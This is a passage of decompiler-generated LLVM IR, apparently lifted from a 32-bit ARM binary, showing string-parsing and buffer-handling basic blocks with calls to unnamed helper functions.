  store i32 0, i32* %stack_var_-44, align 4
  %tmp187 = icmp slt i32 %v3_94d0, 1
  br i1 %tmp187, label %dec_label_pc_9538, label %dec_label_pc_94e8

dec_label_pc_94e8:                                ; preds = %dec_label_pc_94d0
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_9514

dec_label_pc_94f0:                                ; preds = %dec_label_pc_9514
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v3_94f4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_94f4, i32* %r3.global-to-local, align 4
  %v0_94f8 = load i32, i32* @sl, align 4
  %v1_94f8 = add i32 %v0_94f8, 16
  %v2_94f8 = inttoptr i32 %v1_94f8 to i32*
  %v3_94f8 = load i32, i32* %v2_94f8, align 4
  %v1_94fc = add i32 %v3_94f4, 1
  store i32 %v1_94fc, i32* %ip.global-to-local, align 4
  %v3_9500 = icmp uge i32 %v3_94f8, %v1_94fc
  store i1 %v3_9500, i1* %cpsr_c.global-to-local, align 1
  %v9_9500 = icmp eq i32 %v3_94f8, %v1_94fc
  store i1 %v9_9500, i1* %cpsr_z.global-to-local, align 1
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  store i32 %v1_94fc, i32* %r1.global-to-local, align 4
  store i32 %v1_94fc, i32* %stack_var_-44, align 4
  %v7_9510 = icmp sgt i32 %v3_94f8, %v1_94fc
  %v0_9520.pre = load i32, i32* @r5, align 4
  br i1 %v7_9510, label %dec_label_pc_94f0.dec_label_pc_9514_crit_edge, label %dec_label_pc_9538

dec_label_pc_94f0.dec_label_pc_9514_crit_edge:    ; preds = %dec_label_pc_94f0
  %v0_9524.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9514

dec_label_pc_9514:                                ; preds = %dec_label_pc_94f0.dec_label_pc_9514_crit_edge, %dec_label_pc_94e8
  %v0_9524 = phi i32 [ %v0_9524.pre, %dec_label_pc_94f0.dec_label_pc_9514_crit_edge ], [ %v3_94ac, %dec_label_pc_94e8 ]
  %v0_9520 = phi i32 [ %v0_9520.pre, %dec_label_pc_94f0.dec_label_pc_9514_crit_edge ], [ %v0_948c, %dec_label_pc_94e8 ]
  %v0_9514 = phi i32 [ %v1_94fc, %dec_label_pc_94f0.dec_label_pc_9514_crit_edge ], [ 0, %dec_label_pc_94e8 ]
  %v1_9514 = and i32 %v0_9514, 33554432
  %v2_9514 = icmp ne i32 %v1_9514, 0
  store i1 %v2_9514, i1* %cpsr_c.global-to-local, align 1
  %v3_9514 = mul i32 %v0_9514, 128
  %v1_9518 = add i32 %v3_9514, 1472
  %v0_951c = load i32, i32* @sb, align 4
  %v2_951c = add i32 %v1_9518, %v0_951c
  store i32 %v2_951c, i32* %r1.global-to-local, align 4
  store i32 %v0_9520, i32* %r0.global-to-local, align 4
  store i32 %v0_9524, i32* %r2.global-to-local, align 4
  %v3_9528 = inttoptr i32 %v0_9520 to i8*
  %v4_9528 = call i32 @function_127dc(i8* %v3_9528, i32 %v2_951c, i32 %v0_9524)
  store i32 %v4_9528, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_952c = icmp eq i32 %v4_9528, 0
  store i1 %v2_952c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_952c, label %dec_label_pc_94f0, label %dec_label_pc_94c8

dec_label_pc_9538:                                ; preds = %dec_label_pc_94f0, %dec_label_pc_94d0
  %v0_9538 = phi i32 [ %v0_948c, %dec_label_pc_94d0 ], [ %v0_9520.pre, %dec_label_pc_94f0 ]
  store i32 %v0_9538, i32* %r0.global-to-local, align 4
  %v1_953c = inttoptr i32 %v0_9538 to i8*
  %v2_953c = call i32 @function_12370(i8* %v1_953c)
  store i32 %v2_953c, i32* %r0.global-to-local, align 4
  %v2_9540 = icmp ugt i32 %v2_953c, 126
  store i1 %v2_9540, i1* %cpsr_c.global-to-local, align 1
  %v7_9540 = icmp eq i32 %v2_953c, 127
  store i1 %v7_9540, i1* %cpsr_z.global-to-local, align 1
  %v8_9544 = icmp sgt i32 %v2_953c, 127
  br i1 %v8_9544, label %dec_label_pc_94c8, label %dec_label_pc_9548

dec_label_pc_9548:                                ; preds = %dec_label_pc_9538
  %v0_9548 = load i32, i32* @sl, align 4
  %v1_9548 = add i32 %v0_9548, 16
  %v2_9548 = inttoptr i32 %v1_9548 to i32*
  %v3_9548 = load i32, i32* %v2_9548, align 4
  %v1_954c = and i32 %v3_9548, 33554432
  %v2_954c = icmp ne i32 %v1_954c, 0
  store i1 %v2_954c, i1* %cpsr_c.global-to-local, align 1
  %v3_954c = mul i32 %v3_9548, 128
  %v1_9550 = add i32 %v3_954c, 1472
  %v0_9554 = load i32, i32* @r5, align 4
  store i32 %v0_9554, i32* %r1.global-to-local, align 4
  %v0_9558 = load i32, i32* @sb, align 4
  %v2_9558 = add i32 %v1_9550, %v0_9558
  store i32 %v2_9558, i32* @r0, align 4
  %v2_955c = inttoptr i32 %v2_9558 to i8*
  %v3_955c = call i32 @function_12398(i8* %v2_955c, i32 %v0_9554)
  store i32 %v3_955c, i32* %r0.global-to-local, align 4
  %v0_9560 = load i32, i32* @sl, align 4
  %v1_9560 = add i32 %v0_9560, 16
  %v2_9560 = inttoptr i32 %v1_9560 to i32*
  %v3_9560 = load i32, i32* %v2_9560, align 4
  %v0_9564 = load i32, i32* @r8, align 4
  store i32 %v0_9564, i32* @r5, align 4
  %v1_9568 = add i32 %v3_9560, 1
  store i32 %v1_9568, i32* %r3.global-to-local, align 4
  store i32 %v1_9568, i32* %v2_9560, align 4
  %v1_9388.pre.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_937c

dec_label_pc_9574:                                ; preds = %dec_label_pc_859c
  store i32 %v1_859c, i32* %r3.global-to-local, align 4
  %v1_9578 = trunc i32 %v1_859c to i8
  store i8 %v1_9578, i8* %v2_85d4, align 1
  %v0_957c = load i32, i32* @r6, align 4
  %v1_957c = add i32 %v0_957c, -1452
  %v2_957c = inttoptr i32 %v1_957c to i32*
  %v3_957c = load i32, i32* %v2_957c, align 4
  store i32 %v3_957c, i32* @r0, align 4
  %v1_9580 = call i32 @function_15b6c(i32 %v3_957c)
  store i32 %v1_9580, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_9588 = load i32, i32* @r6, align 4
  %v2_9588 = add i32 %v1_9588, -1452
  %v3_9588 = inttoptr i32 %v2_9588 to i32*
  store i32 -1, i32* %v3_9588, align 4
  br label %dec_label_pc_85bc

dec_label_pc_9590:                                ; preds = %dec_label_pc_8d9c
  %v0_9590 = call i32 @function_12f18()
  store i32 %v0_9590, i32* %r0.global-to-local, align 4
  store i32 104, i32* %r3.global-to-local, align 4
  %v2_9598 = inttoptr i32 %v0_9590 to i32*
  store i32 104, i32* %v2_9598, align 4
  br label %dec_label_pc_959c

dec_label_pc_959c:                                ; preds = %dec_label_pc_8dc8, %dec_label_pc_9590
  %v0_959c = call i32 @function_12f18()
  store i32 %v0_959c, i32* %r0.global-to-local, align 4
  %v1_95a0 = inttoptr i32 %v0_959c to i32*
  %v2_95a0 = load i32, i32* %v1_95a0, align 4
  store i32 %v2_95a0, i32* %r3.global-to-local, align 4
  %v2_95a4 = icmp ugt i32 %v2_95a0, 10
  store i1 %v2_95a4, i1* %cpsr_c.global-to-local, align 1
  %v7_95a4 = icmp eq i32 %v2_95a0, 11
  store i1 %v7_95a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_95a4, label %dec_label_pc_87b4, label %dec_label_pc_95ac

dec_label_pc_95ac:                                ; preds = %dec_label_pc_959c
  %v0_95ac = call i32 @function_12f18()
  store i32 %v0_95ac, i32* %r0.global-to-local, align 4
  %v1_95b0 = inttoptr i32 %v0_95ac to i32*
  %v2_95b0 = load i32, i32* %v1_95b0, align 4
  store i32 %v2_95b0, i32* %r3.global-to-local, align 4
  %v2_95b4 = icmp ugt i32 %v2_95b0, 10
  store i1 %v2_95b4, i1* %cpsr_c.global-to-local, align 1
  %v7_95b4 = icmp eq i32 %v2_95b0, 11
  store i1 %v7_95b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_95b4, label %dec_label_pc_87b4, label %dec_label_pc_95bc

dec_label_pc_95bc:                                ; preds = %dec_label_pc_8d24, %dec_label_pc_95ac, %dec_label_pc_9054
  %v0_95bc = load i32, i32* @sl, align 4
  %v1_95bc = add i32 %v0_95bc, -1452
  %v2_95bc = inttoptr i32 %v1_95bc to i32*
  %v3_95bc = load i32, i32* %v2_95bc, align 4
  store i32 %v3_95bc, i32* @r0, align 4
  %v1_95c0 = call i32 @function_15b6c(i32 %v3_95bc)
  store i32 %v1_95c0, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_95cc = load i32, i32* @sl, align 4
  %v2_95cc = add i32 %v1_95cc, -1452
  %v3_95cc = inttoptr i32 %v2_95cc to i32*
  store i32 -1, i32* %v3_95cc, align 4
  %v0_95d0 = load i32, i32* %r2.global-to-local, align 4
  %v1_95d0 = trunc i32 %v0_95d0 to i8
  %v2_95d0 = load i32, i32* @sl, align 4
  %v3_95d0 = add i32 %v2_95d0, -1448
  %v4_95d0 = inttoptr i32 %v3_95d0 to i8*
  store i8 %v1_95d0, i8* %v4_95d0, align 1
  br label %dec_label_pc_87b4

dec_label_pc_95d8:                                ; preds = %dec_label_pc_93b4, %dec_label_pc_937c
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 38, i32* %r0.global-to-local, align 4
  %v3_95e0 = call i32 @function_11a14(i32 38, i32* null)
  %v0_95e4 = load i32, i32* @fp, align 4
  store i32 %v0_95e4, i32* @r1, align 4
  store i32 %v3_95e0, i32* %r2.global-to-local, align 4
  store i32 %v2_8278, i32* %r0.global-to-local, align 4
  %v4_95f0 = call i32 @function_126cc(i8* %v3_829c, i32 %v0_95e4, i32 %v3_95e0)
  store i32 %v4_95f0, i32* %r0.global-to-local, align 4
  %v2_95f4 = icmp eq i32 %v4_95f0, -1
  store i1 %v2_95f4, i1* %cpsr_c.global-to-local, align 1
  %v7_95f4 = icmp eq i32 %v4_95f0, -1
  store i1 %v7_95f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_95f4, label %dec_label_pc_9720, label %dec_label_pc_95fc

dec_label_pc_95fc:                                ; preds = %dec_label_pc_95d8
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 38, i32* %r0.global-to-local, align 4
  %v3_9604 = call i32 @function_11a14(i32 38, i32* null)
  %v0_9608 = load i32, i32* @fp, align 4
  store i32 %v0_9608, i32* @r1, align 4
  store i32 %v3_9604, i32* %r2.global-to-local, align 4
  store i32 %v2_8278, i32* %r0.global-to-local, align 4
  %v4_9614 = call i32 @function_126cc(i8* %v3_829c, i32 %v0_9608, i32 %v3_9604)
  store i32 %v4_9614, i32* %r0.global-to-local, align 4
  store i32 %v2_8278, i32* @lr, align 4
  %v2_961c = add i32 %v4_9614, %v2_8278
  %v3_961c = inttoptr i32 %v2_961c to i8*
  %v4_961c = load i8, i8* %v3_961c, align 1
  %v2_9624 = icmp ugt i8 %v4_961c, 31
  store i1 %v2_9624, i1* %cpsr_c.global-to-local, align 1
  %v7_9624 = icmp eq i8 %v4_961c, 32
  store i1 %v7_9624, i1* %cpsr_z.global-to-local, align 1
  %v2_962c = zext i1 %v7_9624 to i32
  %v2_962c.v4_9614 = add i32 %v2_962c, %v4_9614
  store i32 %v2_962c.v4_9614, i32* @r4, align 4
  %v2_9630 = add i32 %v2_962c.v4_9614, %v2_8278
  store i32 %v2_9630, i32* @r5, align 4
  store i32 %v2_9630, i32* %r0.global-to-local, align 4
  %v1_9638 = load i32, i32* @fp, align 4
  %v2_9638 = sub i32 %v1_9638, %v2_962c.v4_9614
  store i32 %v2_9638, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_197c0.32 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_9644 = call i32 @function_12428(i32 %v2_9630, i32 %v2_9638, i32 ptrtoint ([3 x i8]* @global_var_197c0.32 to i32), i32 2)
  store i32 %v5_9644, i32* %r0.global-to-local, align 4
  %v2_9648 = icmp eq i32 %v5_9644, -1
  store i1 %v2_9648, i1* %cpsr_c.global-to-local, align 1
  %v7_9648 = icmp eq i32 %v5_9644, -1
  store i1 %v7_9648, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9648, label %dec_label_pc_9720, label %dec_label_pc_9650

dec_label_pc_9650:                                ; preds = %dec_label_pc_95fc
  %v2_9650 = icmp ne i32 %v5_9644, 0
  store i1 %v2_9650, i1* %cpsr_c.global-to-local, align 1
  %v7_9650 = icmp eq i32 %v5_9644, 1
  store i1 %v7_9650, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_865c, i32* %r2.global-to-local, align 4
  %v7_9658 = icmp slt i32 %v5_9644, 2
  br i1 %v7_9658, label %bb189, label %bb188

bb188:                                            ; preds = %dec_label_pc_9650
  %v9_9658 = add i32 %v5_9644, -2
  store i32 %v9_9658, i32* %r0.global-to-local, align 4
  br label %bb189

bb189:                                            ; preds = %dec_label_pc_9650, %bb188
  %v1_9660 = phi i32 [ %v5_9644, %dec_label_pc_9650 ], [ %v9_9658, %bb188 ]
  %v2_9660 = add i32 %v1_9660, %v2_86d8
  store i32 -20773, i32* @lr, align 4
  %v1_9668 = add i32 %v1_9660, 1
  store i32 %v1_9668, i32* @r6, align 4
  %v1_966c = load i32, i32* @r4, align 4
  %v2_966c = add i32 %v2_9660, %v1_966c
  store i32 %v2_966c, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  %v0_9674 = load i32, i32* @r5, align 4
  store i32 %v0_9674, i32* %r0.global-to-local, align 4
  store i32 %v1_9668, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_197f0.42 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v4_9684 = add i32 %v2_966c, -20773
  %v5_9684 = inttoptr i32 %v4_9684 to i8*
  store i8 0, i8* %v5_9684, align 1
  %v5_9688 = call i32 @function_12428(i32 %v0_9674, i32 %v1_9668, i32 ptrtoint ([5 x i8]* @global_var_197f0.42 to i32), i32 4)
  store i32 %v5_9688, i32* %r0.global-to-local, align 4
  %v2_968c = icmp ugt i32 %v5_9688, 3
  store i1 %v2_968c, i1* %cpsr_c.global-to-local, align 1
  %v7_968c = icmp eq i32 %v5_9688, 4
  store i1 %v7_968c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_968c, label %dec_label_pc_9a14, label %dec_label_pc_9694

dec_label_pc_9694:                                ; preds = %bb189
  store i32 %v2_8278, i32* %ip.global-to-local, align 4
  %v1_9698 = load i32, i32* @r4, align 4
  %v2_9698 = add i32 %v1_9698, %v2_8278
  %v3_9698 = inttoptr i32 %v2_9698 to i8*
  %v4_9698 = load i8, i8* %v3_9698, align 1
  %v6_9698 = zext i8 %v4_9698 to i32
  store i32 %v6_9698, i32* %r3.global-to-local, align 4
  %v2_969c = icmp ugt i8 %v4_9698, 46
  store i1 %v2_969c, i1* %cpsr_c.global-to-local, align 1
  %v7_969c = icmp eq i8 %v4_9698, 47
  store i1 %v7_969c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_969c, label %dec_label_pc_96a4, label %dec_label_pc_8d40

dec_label_pc_96a4:                                ; preds = %dec_label_pc_9694
  %v0_96a4 = load i32, i32* @sb, align 4
  %v1_96a8 = add i32 %v0_96a4, 533
  store i32 %v1_96a8, i32* @r4, align 4
  store i32 %v1_96a8, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_96b4 = call i32 @function_12404(i32 %v1_96a8, i32 255)
  store i32 %v10_82f0, i32* @lr, align 4
  %v3_96bc = load i32, i32* %stack_var_-44, align 4
  %v0_96c0 = load i32, i32* @r5, align 4
  %v1_96c0 = add i32 %v0_96c0, 1
  store i32 %v1_96c0, i32* @r5, align 4
  %v2_96c4 = add i32 %v1_96c0, %v3_96bc
  store i32 %v2_96c4, i32* %r0.global-to-local, align 4
  %v1_96c8 = inttoptr i32 %v2_96c4 to i8*
  %v2_96c8 = call i32 @function_12370(i8* %v1_96c8)
  store i32 %v2_96c8, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_96cc = icmp eq i32 %v2_96c8, 0
  store i1 %v2_96cc, i1* %cpsr_z.global-to-local, align 1
  %tmp190 = icmp slt i32 %v2_96c8, 1
  br i1 %tmp190, label %dec_label_pc_8d40, label %dec_label_pc_96d4

dec_label_pc_96d4:                                ; preds = %dec_label_pc_96a4
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v3_96d8 = load i32, i32* %stack_var_-44, align 4
  %v0_96dc = load i32, i32* @r5, align 4
  %v2_96dc = add i32 %v0_96dc, %v3_96d8
  store i32 %v2_96dc, i32* %r0.global-to-local, align 4
  %v1_96e0 = inttoptr i32 %v2_96dc to i8*
  %v2_96e0 = call i32 @function_12370(i8* %v1_96e0)
  store i32 %v2_96e0, i32* %r0.global-to-local, align 4
  %v2_96e4 = icmp ugt i32 %v2_96e0, 254
  store i1 %v2_96e4, i1* %cpsr_c.global-to-local, align 1
  %v7_96e4 = icmp eq i32 %v2_96e0, 255
  store i1 %v7_96e4, i1* %cpsr_z.global-to-local, align 1
  %v8_96e8 = icmp sgt i32 %v2_96e0, 255
  br i1 %v8_96e8, label %dec_label_pc_8d40, label %dec_label_pc_96ec

dec_label_pc_96ec:                                ; preds = %dec_label_pc_96d4
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  %v3_96f0 = load i32, i32* %stack_var_-44, align 4
  %v0_96f4 = load i32, i32* @r4, align 4
  store i32 %v0_96f4, i32* @r0, align 4
  %v0_96f8 = load i32, i32* @r5, align 4
  %v2_96f8 = add i32 %v0_96f8, %v3_96f0
  store i32 %v2_96f8, i32* %r1.global-to-local, align 4
  %v2_96fc = inttoptr i32 %v0_96f4 to i8*
  %v3_96fc = call i32 @function_12398(i8* %v2_96fc, i32 %v2_96f8)
  store i32 %v3_96fc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8d40

dec_label_pc_9704:                                ; preds = %dec_label_pc_8e20
  %v0_9704 = load i32, i32* %r3.global-to-local, align 4
  %v1_9704 = add i32 %v0_9704, 1
  store i32 %v1_9704, i32* %r3.global-to-local, align 4
  %v1_9708 = trunc i32 %v1_9704 to i8
  %v2_9708 = load i32, i32* @sl, align 4
  %v3_9708 = add i32 %v2_9708, -1448
  %v4_9708 = inttoptr i32 %v3_9708 to i8*
  store i8 %v1_9708, i8* %v4_9708, align 1
  br label %dec_label_pc_87b4

dec_label_pc_9710:                                ; preds = %dec_label_pc_8c34
  %v0_9710 = load i32, i32* @fp, align 4
  store i32 %v0_9710, i32* @r0, align 4
  %v0_9714 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_9714, i32* %r1.global-to-local, align 4
  %v2_9718 = inttoptr i32 %v0_9710 to i8*
  %v3_9718 = call i32 @function_12398(i8* %v2_9718, i32 %v0_9714)
  store i32 %v3_9718, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8c4c

dec_label_pc_9720:                                ; preds = %dec_label_pc_95fc, %dec_label_pc_95d8
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 37, i32* %r0.global-to-local, align 4
  %v3_9728 = call i32 @function_11a14(i32 37, i32* null)
  %v0_972c = load i32, i32* @fp, align 4
  store i32 %v0_972c, i32* @r1, align 4
  store i32 %v3_9728, i32* %r2.global-to-local, align 4
  store i32 %v2_8278, i32* %r0.global-to-local, align 4
  %v4_9738 = call i32 @function_126cc(i8* %v3_829c, i32 %v0_972c, i32 %v3_9728)
  store i32 %v4_9738, i32* %r0.global-to-local, align 4
  %v2_9740 = icmp eq i32 %v4_9738, -1
  store i1 %v2_9740, i1* %cpsr_c.global-to-local, align 1
  %v7_9740 = icmp eq i32 %v4_9738, -1
  store i1 %v7_9740, i1* %cpsr_z.global-to-local, align 1
  store i32 -20773, i32* @r6, align 4
  br i1 %v7_9740, label %dec_label_pc_993c, label %dec_label_pc_974c

dec_label_pc_974c:                                ; preds = %dec_label_pc_9720
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 37, i32* %r0.global-to-local, align 4
  %v3_9754 = call i32 @function_11a14(i32 37, i32* null)
  %v0_9758 = load i32, i32* @fp, align 4
  store i32 %v0_9758, i32* @r1, align 4
  store i32 %v3_9754, i32* %r2.global-to-local, align 4
  store i32 %v2_8278, i32* %r0.global-to-local, align 4
  %v4_9764 = call i32 @function_126cc(i8* %v3_829c, i32 %v0_9758, i32 %v3_9754)
  store i32 %v4_9764, i32* %r0.global-to-local, align 4
  store i32 %v2_8278, i32* %ip.global-to-local, align 4
  %v2_976c = add i32 %v4_9764, %v2_8278
  %v3_976c = inttoptr i32 %v2_976c to i8*
  %v4_976c = load i8, i8* %v3_976c, align 1
  store i32 %v2_8278, i32* @lr, align 4
  %v2_9774 = icmp ugt i8 %v4_976c, 31
  store i1 %v2_9774, i1* %cpsr_c.global-to-local, align 1
  %v7_9774 = icmp eq i8 %v4_976c, 32
  store i1 %v7_9774, i1* %cpsr_z.global-to-local, align 1
  %v2_977c = zext i1 %v7_9774 to i32
  %v2_977c.v4_9764 = add i32 %v2_977c, %v4_9764
  store i32 %v2_977c.v4_9764, i32* @r4, align 4
  %v2_9780 = add i32 %v2_977c.v4_9764, %v2_8278
  store i32 %v2_9780, i32* @r5, align 4
  store i32 %v2_9780, i32* %r0.global-to-local, align 4
  %v1_9788 = load i32, i32* @fp, align 4
  %v2_9788 = sub i32 %v1_9788, %v2_977c.v4_9764
  store i32 %v2_9788, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_197c0.32 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_9794 = call i32 @function_12428(i32 %v2_9780, i32 %v2_9788, i32 ptrtoint ([3 x i8]* @global_var_197c0.32 to i32), i32 2)
  store i32 %v5_9794, i32* %r0.global-to-local, align 4
  %v2_9798 = icmp eq i32 %v5_9794, -1
  store i1 %v2_9798, i1* %cpsr_c.global-to-local, align 1
  %v7_9798 = icmp eq i32 %v5_9794, -1
  store i1 %v7_9798, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_9794, i32* @r7, align 4
  br i1 %v7_9798, label %dec_label_pc_993c, label %dec_label_pc_97a4

dec_label_pc_97a4:                                ; preds = %dec_label_pc_974c
  %v2_97a4 = icmp ne i32 %v5_9794, 0
  store i1 %v2_97a4, i1* %cpsr_c.global-to-local, align 1
  %v7_97a4 = icmp eq i32 %v5_9794, 1
  store i1 %v7_97a4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_865c, i32* %r1.global-to-local, align 4
  %v7_97ac = icmp slt i32 %v5_9794, 2
  br i1 %v7_97ac, label %bb192, label %bb191

bb191:                                            ; preds = %dec_label_pc_97a4
  %v9_97ac = add i32 %v5_9794, -2
  store i32 %v9_97ac, i32* @r7, align 4
  br label %bb192

bb192:                                            ; preds = %dec_label_pc_97a4, %bb191
  %v1_97b4 = phi i32 [ %v5_9794, %dec_label_pc_97a4 ], [ %v9_97ac, %bb191 ]
  store i32 %v2_86d8, i32* %r1.global-to-local, align 4
  %v2_97b4 = add i32 %v1_97b4, %v2_86d8
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_97bc = load i32, i32* @r4, align 4
  %v2_97bc = add i32 %v2_97b4, %v1_97bc
  %v3_97c0 = load i32, i32* @r6, align 4
  %v4_97c0 = add i32 %v2_97bc, %v3_97c0
  %v5_97c0 = inttoptr i32 %v4_97c0 to i8*
  store i8 0, i8* %v5_97c0, align 1
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  %v0_97c8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_97c8, i32* %stack_var_-44, align 4
  store i32 %v2_8278, i32* %r3.global-to-local, align 4
  %v1_97d0 = load i32, i32* @r4, align 4
  %v2_97d0 = add i32 %v1_97d0, %v2_8278
  %v3_97d0 = inttoptr i32 %v2_97d0 to i8*
  %v4_97d0 = load i8, i8* %v3_97d0, align 1
  %v6_97d0 = zext i8 %v4_97d0 to i32
  store i32 %v6_97d0, i32* %r0.global-to-local, align 4
  %v1_97d4 = add nsw i32 %v6_97d0, -48
  store i32 %v1_97d4, i32* %r3.global-to-local, align 4
  %v2_97d8 = icmp ugt i32 %v1_97d4, 8
  store i1 %v2_97d8, i1* %cpsr_c.global-to-local, align 1
  %v7_97d8 = icmp eq i32 %v1_97d4, 9
  store i1 %v7_97d8, i1* %cpsr_z.global-to-local, align 1
  %v2_97dc = xor i1 %v7_97d8, true
  %v3_97dc = and i1 %v2_97d8, %v2_97dc
  br i1 %v3_97dc, label %.thread105, label %dec_label_pc_97e4

.thread105:                                       ; preds = %bb192
  %v4_97dc = load i32, i32* @r5, align 4
  store i32 %v4_97dc, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_980c

dec_label_pc_97e4:                                ; preds = %bb192
  %v1_97f4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_97e8

dec_label_pc_97e8:                                ; preds = %dec_label_pc_97e8, %dec_label_pc_97e4
  %v0_97e8 = phi i32 [ %v1_9800, %dec_label_pc_97e8 ], [ 1, %dec_label_pc_97e4 ]
  store i32 %v0_97e8, i32* %ip.global-to-local, align 4
  store i32 %v0_97e8, i32* %stack_var_-44, align 4
  %v2_97f4 = add i32 %v0_97e8, %v1_97f4.pre
  %v3_97f4 = inttoptr i32 %v2_97f4 to i8*
  %v4_97f4 = load i8, i8* %v3_97f4, align 1
  %v6_97f4 = zext i8 %v4_97f4 to i32
  store i32 %v6_97f4, i32* %r0.global-to-local, align 4
  %v1_97f8 = add nsw i32 %v6_97f4, -48
  store i32 %v1_97f8, i32* %r3.global-to-local, align 4
  %v2_97fc = icmp ugt i32 %v1_97f8, 8
  store i1 %v2_97fc, i1* %cpsr_c.global-to-local, align 1
  %v7_97fc = icmp eq i32 %v1_97f8, 9
  store i1 %v7_97fc, i1* %cpsr_z.global-to-local, align 1
  %v1_9800 = add i32 %v0_97e8, 1
  store i32 %v1_9800, i32* @lr, align 4
  store i32 %v2_97f4, i32* %r1.global-to-local, align 4
  %v2_9808 = xor i1 %v2_97fc, true
  %v3_9808 = or i1 %v7_97fc, %v2_9808
  br i1 %v3_9808, label %dec_label_pc_97e8, label %dec_label_pc_980c

dec_label_pc_980c:                                ; preds = %dec_label_pc_97e8, %.thread105
  %v2_9818 = phi i32 [ %v4_97dc, %.thread105 ], [ %v2_97f4, %dec_label_pc_97e8 ]
  %v0_980c = phi i32 [ %v6_97d0, %.thread105 ], [ %v6_97f4, %dec_label_pc_97e8 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_980c = icmp eq i32 %v0_980c, 0
  store i1 %v2_980c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_980c, label %dec_label_pc_993c, label %dec_label_pc_9814

dec_label_pc_9814:                                ; preds = %dec_label_pc_980c
  store i32 0, i32* @r6, align 4
  %v3_9818 = inttoptr i32 %v2_9818 to i8*
  store i8 0, i8* %v3_9818, align 1
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v3_9820 = load i32, i32* %stack_var_-44, align 4
  %v1_9824 = add i32 %v3_9820, 1
  store i32 %v1_9824, i32* %ip.global-to-local, align 4
  store i32 %v1_9824, i32* %stack_var_-44, align 4
  %v0_982c = load i32, i32* @r5, align 4
  %v2_982c = add i32 %v0_982c, %v1_9824
  %v3_982c = inttoptr i32 %v2_982c to i8*
  %v4_982c = load i8, i8* %v3_982c, align 1
  %v6_982c = zext i8 %v4_982c to i32
  store i32 %v6_982c, i32* %r3.global-to-local, align 4
  %v2_9830 = icmp ugt i8 %v4_982c, 31
  store i1 %v2_9830, i1* %cpsr_c.global-to-local, align 1
  %v7_9830 = icmp eq i8 %v4_982c, 32
  store i1 %v7_9830, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9830, label %bb193, label %.thread31

.thread31:                                        ; preds = %dec_label_pc_9814
  store i32 %v2_982c, i32* @r4, align 4
  br label %bb194

bb193:                                            ; preds = %dec_label_pc_9814
  %v2_9834 = add i32 %v3_9820, 2
  store i32 %v2_9834, i32* %ip.global-to-local, align 4
  %v2_9838 = add i32 %v0_982c, %v2_9834
  store i32 %v2_9838, i32* @r4, align 4
  store i32 %v2_9834, i32* %stack_var_-44, align 4
  br label %bb194

bb194:                                            ; preds = %.thread31, %bb193
  %v0_9840 = phi i32 [ %v2_982c, %.thread31 ], [ %v2_9838, %bb193 ]
  store i32 %v0_9840, i32* %r0.global-to-local, align 4
  %v1_9844 = inttoptr i32 %v0_9840 to i8*
  %v2_9844 = call i32 @function_12370(i8* %v1_9844)
  store i32 ptrtoint ([5 x i8]* @global_var_197f8.44 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_9844, i32* @r1, align 4
  %v0_9850 = load i32, i32* @r4, align 4
  store i32 %v0_9850, i32* %r0.global-to-local, align 4
  %v4_9854 = inttoptr i32 %v0_9850 to i8*
  %v5_9854 = call i32 @function_126cc(i8* %v4_9854, i32 %v2_9844, i32 ptrtoint ([5 x i8]* @global_var_197f8.44 to i32))
  store i32 %v5_9854, i32* %r0.global-to-local, align 4
  %v2_9858 = icmp eq i32 %v5_9854, -1
  store i1 %v2_9858, i1* %cpsr_c.global-to-local, align 1
  %v7_9858 = icmp eq i32 %v5_9854, -1
  store i1 %v7_9858, i1* %cpsr_z.global-to-local, align 1
